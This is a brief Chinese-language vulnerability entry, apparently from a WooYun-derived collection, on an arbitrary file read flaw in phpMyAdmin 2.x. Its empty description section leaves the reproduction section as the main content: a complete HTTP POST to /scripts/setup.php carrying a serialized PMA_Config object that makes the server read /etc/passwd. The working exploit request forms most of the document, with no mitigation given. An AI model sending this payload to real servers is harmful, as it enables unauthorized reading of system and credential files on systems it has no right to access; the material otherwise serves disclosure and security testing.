（WooYun-2016-1994）Phpmyadmin 任意文件读取漏洞
===============================================

一、漏洞简介
------------

二、漏洞影响
------------

phpMyAdmin2.x 版本

三、复现过程
------------

    POST /scripts/setup.php HTTP/1.1 
    Host: www.0-sec.org:8080
    Accept-Encoding: gzip, deflate Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded Content-Length: 80
    action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
